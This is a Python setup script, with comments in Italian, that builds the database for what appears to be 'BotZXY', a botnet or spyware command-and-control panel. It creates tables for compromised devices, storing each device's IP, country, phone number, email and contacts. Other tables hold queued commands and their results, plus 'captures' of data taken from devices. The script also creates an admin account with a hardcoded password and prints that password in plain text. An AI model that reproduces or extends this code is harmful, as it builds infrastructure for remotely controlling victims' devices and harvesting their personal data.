import sqlite3
import hashlib
import os

DB_PATH = 'database/botzxy_c2.db'

os.makedirs('database', exist_ok=True)
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

# Crea tabella users
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    api_key TEXT UNIQUE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
''')

# Crea altre tabelle
cursor.execute('''
CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE NOT NULL,
    user_id INTEGER REFERENCES users(id),
    platform TEXT,
    hostname TEXT,
    ip TEXT,
    country TEXT,
    os_version TEXT,
    is_online BOOLEAN DEFAULT 1,
    last_seen TIMESTAMP,
    registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    phone_number TEXT,
    email TEXT,
    contacts TEXT,
    bot_name TEXT DEFAULT "BotZXY"
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT REFERENCES devices(device_id),
    command TEXT NOT NULL,
    params TEXT,
    status TEXT DEFAULT "pending",
    result TEXT,
    executed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS captures (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT REFERENCES devices(device_id),
    type TEXT,
    data TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    action TEXT,
    details TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
''')

# Elimina vecchi admin
cursor.execute("DELETE FROM users WHERE username = 'admin'")
cursor.execute("DELETE FROM users WHERE username = 'BotZXY-Admin'")

# Crea nuovo admin
api_key = hashlib.sha256(os.urandom(32)).hexdigest()
password_hash = hashlib.sha256("35£t}nSBzoA%M#4T\e<".encode()).hexdigest()

cursor.execute(
    "INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)",
    ('BotZXY-Admin', password_hash, api_key)
)

conn.commit()
conn.close()

print('✅ Database e admin creati con successo!')
print('📌 Username: BotZXY-Admin')
print('📌 Password: 35£t}nSBzoA%M#4T\e<')